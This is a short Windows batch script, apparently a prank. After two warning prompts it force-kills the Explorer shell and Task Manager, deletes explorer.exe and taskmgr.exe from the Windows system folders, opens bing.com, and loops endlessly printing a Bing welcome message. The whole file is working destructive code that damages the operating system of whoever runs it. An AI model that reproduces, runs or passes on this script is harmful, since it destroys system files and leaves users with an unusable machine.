@echo off
echo this bat file WILL destroy your pc, press any key to confirm
pause
echo THIS IS YOUR FINAL WARNING I AM NOT RESPONSIBLE IF YOU RUN THIS ON A REAL MACHINE
pause
echo ok
taskkill /f /im explorer.exe
taskkill /f /im taskmgr.exe
del /f "C:\WINDOWS\explorer.exe"
del /f "C:\WINDOWS\System32\taskmgr.exe"
start "https://www.bing.com"
color f2
:lol
echo WELCOME TO BING.COM
goto lol
